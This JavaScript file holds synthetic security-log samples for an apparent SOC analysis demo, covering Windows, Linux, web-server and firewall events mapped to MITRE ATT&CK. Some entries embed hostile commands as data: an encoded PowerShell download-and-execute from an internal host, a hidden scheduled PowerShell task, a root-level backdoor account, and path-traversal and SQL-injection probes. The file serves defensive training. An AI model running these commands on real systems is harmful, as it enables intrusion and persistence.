/**
 * KHAN SECURITY SOLUTIONS ENTERPRISE
 * Sample Log Data — Educational / Demonstration Content
 *
 * These are realistic-looking but entirely synthetic log entries.
 * They are used to demonstrate SOC analysis capabilities.
 * No real systems, users, or IP addresses are represented.
 *
 * [EDUCATIONAL SIMULATION — NOT REAL SECURITY DATA]
 */

const SampleLogs = {

  // ── Windows Event Logs (EVTX format parsed to JSON) ─────────────────────────
  windows: [
    // --- Brute Force Sequence ---
    { ts: '2025-06-15T08:00:12Z', id: 4625, level: 'warning',  host: 'WORKSTATION-07', user: 'administrator', ip: '192.168.10.45', msg: 'An account failed to log on. Logon Type: 3 (Network). Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T08:00:14Z', id: 4625, level: 'warning',  host: 'WORKSTATION-07', user: 'administrator', ip: '192.168.10.45', msg: 'An account failed to log on. Logon Type: 3 (Network). Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T08:00:16Z', id: 4625, level: 'warning',  host: 'WORKSTATION-07', user: 'administrator', ip: '192.168.10.45', msg: 'An account failed to log on. Logon Type: 3 (Network). Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T08:00:18Z', id: 4625, level: 'warning',  host: 'WORKSTATION-07', user: 'administrator', ip: '192.168.10.45', msg: 'An account failed to log on. Logon Type: 3 (Network). Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T08:00:20Z', id: 4625, level: 'warning',  host: 'WORKSTATION-07', user: 'administrator', ip: '192.168.10.45', msg: 'An account failed to log on. Logon Type: 3 (Network). Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T08:00:22Z', id: 4625, level: 'critical', host: 'WORKSTATION-07', user: 'administrator', ip: '192.168.10.45', msg: 'An account failed to log on. Logon Type: 3 (Network). Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T08:00:40Z', id: 4740, level: 'critical', host: 'DC01',           user: 'administrator', ip: '192.168.10.45', msg: 'A user account was locked out. Caller Computer Name: WORKSTATION-07.', category: 'Account Lockout', mitre: 'T1110.001' },
    // --- Successful Login after brute force ---
    { ts: '2025-06-15T08:05:33Z', id: 4624, level: 'info',     host: 'WORKSTATION-07', user: 'jsmith',       ip: '192.168.10.22', msg: 'An account was successfully logged on. Logon Type: 10 (RemoteInteractive). Authentication Package: NTLM.', category: 'Authentication', mitre: 'T1078' },
    // --- New User Created ---
    { ts: '2025-06-15T08:10:01Z', id: 4720, level: 'warning',  host: 'DC01',           user: 'SYSTEM',       ip: '10.0.0.1',      msg: 'A user account was created. New Account Name: svc_backup_new. Subject Account Name: jsmith.', category: 'Account Management', mitre: 'T1136.001' },
    // --- Privilege Escalation ---
    { ts: '2025-06-15T08:12:45Z', id: 4672, level: 'warning',  host: 'DC01',           user: 'jsmith',       ip: '192.168.10.22', msg: 'Special privileges assigned to new logon. Privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeTcbPrivilege.', category: 'Privilege Use', mitre: 'T1078.002' },
    // --- Suspicious PowerShell ---
    { ts: '2025-06-15T08:14:02Z', id: 4688, level: 'critical', host: 'WORKSTATION-07', user: 'jsmith',       ip: '192.168.10.22', msg: 'A new process was created. New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. Command Line: powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AcABhAHkAbABvAGEAZAAiACkA', category: 'Process Execution', mitre: 'T1059.001' },
    // --- Scheduled Task Created ---
    { ts: '2025-06-15T08:20:11Z', id: 4698, level: 'warning',  host: 'WORKSTATION-07', user: 'jsmith',       ip: '192.168.10.22', msg: 'A scheduled task was created. Task Name: \\Microsoft\\Windows\\Maintenance\\SysUpdate. Task Content: cmd.exe /c "start /b powershell.exe -nop -w hidden"', category: 'Persistence', mitre: 'T1053.005' },
    // --- Remote Desktop ---
    { ts: '2025-06-15T08:25:00Z', id: 4624, level: 'info',     host: 'SERVER-02',     user: 'jsmith',       ip: '192.168.10.22', msg: 'An account was successfully logged on. Logon Type: 10 (RemoteInteractive). Workstation Name: WORKSTATION-07.', category: 'Authentication', mitre: 'T1021.001' },
    // --- Security Audit Disabled ---
    { ts: '2025-06-15T08:26:44Z', id: 4719, level: 'critical', host: 'WORKSTATION-07', user: 'jsmith',       ip: '192.168.10.22', msg: 'System audit policy was changed. Audit Policy Change: Success removed, Failure removed.', category: 'Audit Policy', mitre: 'T1562.002' },
    // --- Normal activity ---
    { ts: '2025-06-15T09:00:00Z', id: 4624, level: 'info',     host: 'WORKSTATION-01', user: 'bwilson',      ip: '192.168.10.10', msg: 'An account was successfully logged on. Logon Type: 2 (Interactive).', category: 'Authentication', mitre: null },
    { ts: '2025-06-15T09:05:22Z', id: 4624, level: 'info',     host: 'WORKSTATION-02', user: 'akhan',        ip: '192.168.10.11', msg: 'An account was successfully logged on. Logon Type: 2 (Interactive).', category: 'Authentication', mitre: null },
    { ts: '2025-06-15T09:10:45Z', id: 4624, level: 'info',     host: 'WORKSTATION-03', user: 'mlee',         ip: '192.168.10.12', msg: 'An account was successfully logged on. Logon Type: 2 (Interactive).', category: 'Authentication', mitre: null },
    { ts: '2025-06-15T09:22:01Z', id: 4625, level: 'warning',  host: 'WORKSTATION-04', user: 'rjones',       ip: '192.168.10.13', msg: 'An account failed to log on. Logon Type: 2. Failure reason: Wrong password.', category: 'Authentication', mitre: null },
    { ts: '2025-06-15T09:23:00Z', id: 4624, level: 'info',     host: 'WORKSTATION-04', user: 'rjones',       ip: '192.168.10.13', msg: 'An account was successfully logged on. Logon Type: 2 (Interactive).', category: 'Authentication', mitre: null },
    // --- Password Spray ---
    { ts: '2025-06-15T10:00:00Z', id: 4625, level: 'warning',  host: 'DC01',           user: 'bwilson',      ip: '10.0.0.99',     msg: 'An account failed to log on. Logon Type: 3. Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110.003' },
    { ts: '2025-06-15T10:00:02Z', id: 4625, level: 'warning',  host: 'DC01',           user: 'akhan',        ip: '10.0.0.99',     msg: 'An account failed to log on. Logon Type: 3. Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110.003' },
    { ts: '2025-06-15T10:00:04Z', id: 4625, level: 'warning',  host: 'DC01',           user: 'mlee',         ip: '10.0.0.99',     msg: 'An account failed to log on. Logon Type: 3. Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110.003' },
    { ts: '2025-06-15T10:00:06Z', id: 4625, level: 'warning',  host: 'DC01',           user: 'rjones',       ip: '10.0.0.99',     msg: 'An account failed to log on. Logon Type: 3. Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110.003' },
    { ts: '2025-06-15T10:00:08Z', id: 4625, level: 'warning',  host: 'DC01',           user: 'hpatel',       ip: '10.0.0.99',     msg: 'An account failed to log on. Logon Type: 3. Failure reason: Unknown user name or bad password.', category: 'Authentication', mitre: 'T1110.003' },
    // --- User Deleted ---
    { ts: '2025-06-15T10:30:00Z', id: 4726, level: 'warning',  host: 'DC01',           user: 'jsmith',       ip: '192.168.10.22', msg: 'A user account was deleted. Target Account Name: svc_old_backup. Subject Account Name: jsmith.', category: 'Account Management', mitre: 'T1070.001' },
    // --- SMB Lateral Movement ---
    { ts: '2025-06-15T10:45:00Z', id: 5145, level: 'warning',  host: 'SERVER-03',     user: 'jsmith',       ip: '192.168.10.22', msg: 'A network share object was checked to see whether client can be granted desired access. Share Name: \\\\SERVER-03\\Admin$. Access Request: ReadData|WriteData|Execute.', category: 'Lateral Movement', mitre: 'T1021.002' },
    { ts: '2025-06-15T10:45:12Z', id: 5145, level: 'warning',  host: 'SERVER-04',     user: 'jsmith',       ip: '192.168.10.22', msg: 'A network share object was checked. Share Name: \\\\SERVER-04\\C$. Access Request: ReadData|WriteData.', category: 'Lateral Movement', mitre: 'T1021.002' },
    // --- New Admin Added ---
    { ts: '2025-06-15T11:00:00Z', id: 4732, level: 'critical', host: 'DC01',           user: 'jsmith',       ip: '192.168.10.22', msg: 'A member was added to a security-enabled local group. Group Name: Administrators. Member Account Name: svc_backup_new.', category: 'Account Management', mitre: 'T1136.001' },
  ],

  // ── Linux auth.log entries ──────────────────────────────────────────────────
  linux: [
    { ts: '2025-06-15T06:00:01Z', level: 'info',     host: 'web-server-01', user: 'root',    ip: '10.0.1.5',    msg: 'sshd[1234]: Accepted publickey for root from 10.0.1.5 port 52210 ssh2: RSA SHA256:abc123def456', category: 'Authentication', mitre: null },
    { ts: '2025-06-15T06:15:22Z', level: 'warning',  host: 'web-server-01', user: 'invalid', ip: '185.220.101.5', msg: 'sshd[1240]: Invalid user admin from 185.220.101.5 port 34521', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T06:15:24Z', level: 'warning',  host: 'web-server-01', user: 'invalid', ip: '185.220.101.5', msg: 'sshd[1241]: Invalid user root from 185.220.101.5 port 34522', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T06:15:26Z', level: 'warning',  host: 'web-server-01', user: 'invalid', ip: '185.220.101.5', msg: 'sshd[1242]: Invalid user ubuntu from 185.220.101.5 port 34523', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T06:15:28Z', level: 'warning',  host: 'web-server-01', user: 'invalid', ip: '185.220.101.5', msg: 'sshd[1243]: Invalid user oracle from 185.220.101.5 port 34524', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T06:15:30Z', level: 'warning',  host: 'web-server-01', user: 'invalid', ip: '185.220.101.5', msg: 'sshd[1244]: Invalid user postgres from 185.220.101.5 port 34525', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T06:15:32Z', level: 'warning',  host: 'web-server-01', user: 'invalid', ip: '185.220.101.5', msg: 'sshd[1245]: Invalid user jenkins from 185.220.101.5 port 34526', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T06:15:34Z', level: 'warning',  host: 'web-server-01', user: 'invalid', ip: '185.220.101.5', msg: 'sshd[1246]: Invalid user git from 185.220.101.5 port 34527', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T06:15:36Z', level: 'critical', host: 'web-server-01', user: 'invalid', ip: '185.220.101.5', msg: 'sshd[1247]: Invalid user tomcat from 185.220.101.5 port 34528', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T07:00:00Z', level: 'warning',  host: 'db-server-01',  user: 'root',    ip: '10.0.1.99',   msg: 'sudo: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/bash', category: 'Privilege Escalation', mitre: 'T1548.003' },
    { ts: '2025-06-15T07:05:11Z', level: 'warning',  host: 'db-server-01',  user: 'jdoe',    ip: '10.0.1.99',   msg: 'useradd[2100]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash', category: 'Account Management', mitre: 'T1136.001' },
    { ts: '2025-06-15T07:10:00Z', level: 'info',     host: 'app-server-01', user: 'deploy',  ip: '10.0.1.20',   msg: 'sshd[3100]: Accepted password for deploy from 10.0.1.20 port 41200 ssh2', category: 'Authentication', mitre: null },
    { ts: '2025-06-15T07:15:00Z', level: 'info',     host: 'app-server-01', user: 'deploy',  ip: '10.0.1.20',   msg: 'sshd[3101]: session opened for user deploy by (uid=0)', category: 'Authentication', mitre: null },
    { ts: '2025-06-15T07:30:00Z', level: 'info',     host: 'app-server-01', user: 'bwilson', ip: '192.168.1.50', msg: 'sshd[3200]: Accepted publickey for bwilson from 192.168.1.50 port 49100 ssh2', category: 'Authentication', mitre: null },
    { ts: '2025-06-15T08:00:00Z', level: 'warning',  host: 'web-server-02', user: 'www-data', ip: '203.0.113.88', msg: 'sshd[4000]: Failed password for www-data from 203.0.113.88 port 55200 ssh2', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T08:00:02Z', level: 'warning',  host: 'web-server-02', user: 'www-data', ip: '203.0.113.88', msg: 'sshd[4001]: Failed password for www-data from 203.0.113.88 port 55201 ssh2', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T08:00:04Z', level: 'warning',  host: 'web-server-02', user: 'www-data', ip: '203.0.113.88', msg: 'sshd[4002]: Failed password for www-data from 203.0.113.88 port 55202 ssh2', category: 'Authentication', mitre: 'T1110' },
    { ts: '2025-06-15T09:00:00Z', level: 'info',     host: 'web-server-01', user: 'akhan',   ip: '192.168.1.55', msg: 'sshd[5000]: Accepted publickey for akhan from 192.168.1.55 port 50100 ssh2', category: 'Authentication', mitre: null },
  ],

  // ── Apache Access Logs ───────────────────────────────────────────────────────
  apache: [
    { ts: '2025-06-15T06:00:05Z', level: 'info',     host: 'web-server-01', ip: '192.168.1.100', method: 'GET',  path: '/index.html',          status: 200, bytes: 4523, ua: 'Mozilla/5.0', msg: 'GET /index.html HTTP/1.1 200', category: 'Web Access' },
    { ts: '2025-06-15T06:01:12Z', level: 'info',     host: 'web-server-01', ip: '192.168.1.101', method: 'POST', path: '/api/login',            status: 200, bytes: 128,  ua: 'Mozilla/5.0', msg: 'POST /api/login HTTP/1.1 200', category: 'Web Access' },
    { ts: '2025-06-15T06:02:33Z', level: 'warning',  host: 'web-server-01', ip: '203.0.113.10',  method: 'GET',  path: '/admin',               status: 403, bytes: 289,  ua: 'curl/7.68.0', msg: 'GET /admin HTTP/1.1 403 — Forbidden', category: 'Web Access' },
    { ts: '2025-06-15T06:03:01Z', level: 'critical', host: 'web-server-01', ip: '203.0.113.10',  method: 'GET',  path: '/../../../../etc/passwd', status: 400, bytes: 0,   ua: 'curl/7.68.0', msg: 'GET /../../../../etc/passwd HTTP/1.1 400 — Path traversal attempt', category: 'Web Attack' },
    { ts: '2025-06-15T06:04:22Z', level: 'critical', host: 'web-server-01', ip: '203.0.113.10',  method: 'GET',  path: "/?id=1' OR '1'='1",    status: 400, bytes: 0,    ua: 'sqlmap/1.7', msg: "GET /?id=1' OR '1'='1 — SQL Injection attempt", category: 'Web Attack' },
    { ts: '2025-06-15T06:05:00Z', level: 'warning',  host: 'web-server-01', ip: '203.0.113.10',  method: 'GET',  path: '/wp-login.php',        status: 404, bytes: 0,    ua: 'WPScan', msg: 'GET /wp-login.php HTTP/1.1 404 — Scanner probe', category: 'Web Attack' },
    { ts: '2025-06-15T06:06:00Z', level: 'warning',  host: 'web-server-01', ip: '203.0.113.10',  method: 'GET',  path: '/.env',                status: 404, bytes: 0,    ua: 'WPScan', msg: 'GET /.env HTTP/1.1 404 — Credential file probe', category: 'Web Attack' },
    { ts: '2025-06-15T07:00:00Z', level: 'info',     host: 'web-server-01', ip: '10.0.0.1',      method: 'GET',  path: '/health',              status: 200, bytes: 42,   ua: 'HealthChecker/1.0', msg: 'GET /health HTTP/1.1 200', category: 'Web Access' },
    { ts: '2025-06-15T08:00:00Z', level: 'info',     host: 'web-server-01', ip: '192.168.1.102', method: 'GET',  path: '/dashboard',           status: 200, bytes: 8120, ua: 'Mozilla/5.0', msg: 'GET /dashboard HTTP/1.1 200', category: 'Web Access' },
    { ts: '2025-06-15T09:00:00Z', level: 'warning',  host: 'web-server-01', ip: '10.10.10.5',    method: 'POST', path: '/api/upload',          status: 500, bytes: 0,    ua: 'python-requests/2.28', msg: 'POST /api/upload HTTP/1.1 500 — Server Error', category: 'Web Access' },
  ],

  // ── Nginx Access Logs ────────────────────────────────────────────────────────
  nginx: [
    { ts: '2025-06-15T06:00:00Z', level: 'info',    host: 'nginx-proxy-01', ip: '10.0.0.2',     method: 'GET',  path: '/',              status: 200, bytes: 2048, msg: '10.0.0.2 - - [15/Jun/2025:06:00:00] "GET / HTTP/1.1" 200 2048', category: 'Web Access' },
    { ts: '2025-06-15T06:00:05Z', level: 'warning', host: 'nginx-proxy-01', ip: '198.51.100.44', method: 'GET',  path: '/xmlrpc.php',   status: 404, bytes: 0,    msg: '198.51.100.44 - - "GET /xmlrpc.php HTTP/1.1" 404 — Scanner', category: 'Web Attack' },
    { ts: '2025-06-15T06:01:00Z', level: 'warning', host: 'nginx-proxy-01', ip: '198.51.100.44', method: 'POST', path: '/xmlrpc.php',   status: 404, bytes: 0,    msg: '198.51.100.44 - - "POST /xmlrpc.php HTTP/1.1" 404 — Scanner', category: 'Web Attack' },
    { ts: '2025-06-15T06:10:00Z', level: 'info',    host: 'nginx-proxy-01', ip: '10.0.0.3',     method: 'GET',  path: '/api/v1/status', status: 200, bytes: 512,  msg: '10.0.0.3 - - "GET /api/v1/status HTTP/1.1" 200 512', category: 'Web Access' },
    { ts: '2025-06-15T07:00:00Z', level: 'warning', host: 'nginx-proxy-01', ip: '172.16.0.99',   method: 'GET',  path: '/server-status', status: 403, bytes: 0,    msg: '172.16.0.99 - - "GET /server-status HTTP/1.1" 403 — Probe', category: 'Web Attack' },
  ],

  // ── Firewall Logs ────────────────────────────────────────────────────────────
  firewall: [
    { ts: '2025-06-15T06:00:00Z', level: 'info',     host: 'FW-EDGE-01', src: '192.168.10.10', dst: '8.8.8.8',        sport: 52000, dport: 53,   proto: 'UDP',  action: 'ALLOW', bytes: 64,   msg: 'ALLOW UDP 192.168.10.10:52000 -> 8.8.8.8:53 DNS Query', category: 'DNS' },
    { ts: '2025-06-15T06:00:01Z', level: 'info',     host: 'FW-EDGE-01', src: '192.168.10.11', dst: '1.1.1.1',        sport: 52001, dport: 53,   proto: 'UDP',  action: 'ALLOW', bytes: 64,   msg: 'ALLOW UDP 192.168.10.11:52001 -> 1.1.1.1:53 DNS Query', category: 'DNS' },
    { ts: '2025-06-15T06:05:00Z', level: 'warning',  host: 'FW-EDGE-01', src: '10.0.0.99',     dst: '192.168.10.0',   sport: 44444, dport: 445,  proto: 'TCP',  action: 'BLOCK', bytes: 0,    msg: 'BLOCK TCP 10.0.0.99:44444 -> 192.168.10.0/24:445 SMB Scan', category: 'Firewall' },
    { ts: '2025-06-15T06:05:01Z', level: 'warning',  host: 'FW-EDGE-01', src: '10.0.0.99',     dst: '192.168.10.1',   sport: 44445, dport: 445,  proto: 'TCP',  action: 'BLOCK', bytes: 0,    msg: 'BLOCK TCP 10.0.0.99:44445 -> 192.168.10.1:445 SMB Scan', category: 'Firewall' },
    { ts: '2025-06-15T06:05:02Z', level: 'warning',  host: 'FW-EDGE-01', src: '10.0.0.99',     dst: '192.168.10.2',   sport: 44446, dport: 445,  proto: 'TCP',  action: 'BLOCK', bytes: 0,    msg: 'BLOCK TCP 10.0.0.99:44446 -> 192.168.10.2:445 SMB Scan', category: 'Firewall' },
    { ts: '2025-06-15T07:00:00Z', level: 'critical', host: 'FW-EDGE-01', src: '185.220.101.5', dst: '10.0.1.5',       sport: 34521, dport: 22,   proto: 'TCP',  action: 'BLOCK', bytes: 0,    msg: 'BLOCK TCP 185.220.101.5:34521 -> 10.0.1.5:22 SSH Brute Force', category: 'Firewall', mitre: 'T1110' },
    { ts: '2025-06-15T07:30:00Z', level: 'critical', host: 'FW-EDGE-01', src: '192.168.10.22', dst: '10.0.0.50',      sport: 55555, dport: 4444, proto: 'TCP',  action: 'ALLOW', bytes: 2048, msg: 'ALLOW TCP 192.168.10.22:55555 -> 10.0.0.50:4444 Possible C2 Beacon', category: 'C2', mitre: 'T1071' },
    { ts: '2025-06-15T07:35:00Z', level: 'critical', host: 'FW-EDGE-01', src: '192.168.10.22', dst: '10.0.0.50',      sport: 55556, dport: 4444, proto: 'TCP',  action: 'ALLOW', bytes: 1024, msg: 'ALLOW TCP 192.168.10.22:55556 -> 10.0.0.50:4444 Possible C2 Beacon', category: 'C2', mitre: 'T1071' },
    { ts: '2025-06-15T08:00:00Z', level: 'info',     host: 'FW-EDGE-01', src: '192.168.10.0',  dst: '0.0.0.0/0',      sport: 0,     dport: 443,  proto: 'TCP',  action: 'ALLOW', bytes: 51200, msg: 'ALLOW TCP 192.168.10.0/24:* -> *:443 HTTPS Normal Egress', category: 'Firewall' },
    { ts: '2025-06-15T08:45:00Z', level: 'warning',  host: 'FW-EDGE-01', src: '192.168.10.22', dst: '10.0.0.51',      sport: 12345, dport: 8080, proto: 'TCP',  action: 'ALLOW', bytes: 512,  msg: 'ALLOW TCP 192.168.10.22 -> 10.0.0.51:8080 Unusual outbound port', category: 'Firewall' },
  ],

  // ── MITRE ATT&CK Technique Reference (for enrichment) ───────────────────────
  mitreTechniques: {
    'T1110':     { name: 'Brute Force',                        tactic: 'Credential Access' },
    'T1110.001': { name: 'Password Guessing',                   tactic: 'Credential Access' },
    'T1110.003': { name: 'Password Spraying',                   tactic: 'Credential Access' },
    'T1078':     { name: 'Valid Accounts',                      tactic: 'Initial Access' },
    'T1078.002': { name: 'Domain Accounts',                     tactic: 'Privilege Escalation' },
    'T1059.001': { name: 'PowerShell',                          tactic: 'Execution' },
    'T1053.005': { name: 'Scheduled Task/Job',                  tactic: 'Persistence' },
    'T1021.001': { name: 'Remote Desktop Protocol',             tactic: 'Lateral Movement' },
    'T1021.002': { name: 'SMB/Windows Admin Shares',            tactic: 'Lateral Movement' },
    'T1562.002': { name: 'Disable Windows Event Logging',       tactic: 'Defense Evasion' },
    'T1136.001': { name: 'Create Local Account',                tactic: 'Persistence' },
    'T1070.001': { name: 'Clear Windows Event Logs',            tactic: 'Defense Evasion' },
    'T1548.003': { name: 'Sudo and Sudo Caching',               tactic: 'Privilege Escalation' },
    'T1071':     { name: 'Application Layer Protocol (C2)',      tactic: 'Command and Control' },
  },

};

window.SampleLogs = SampleLogs;
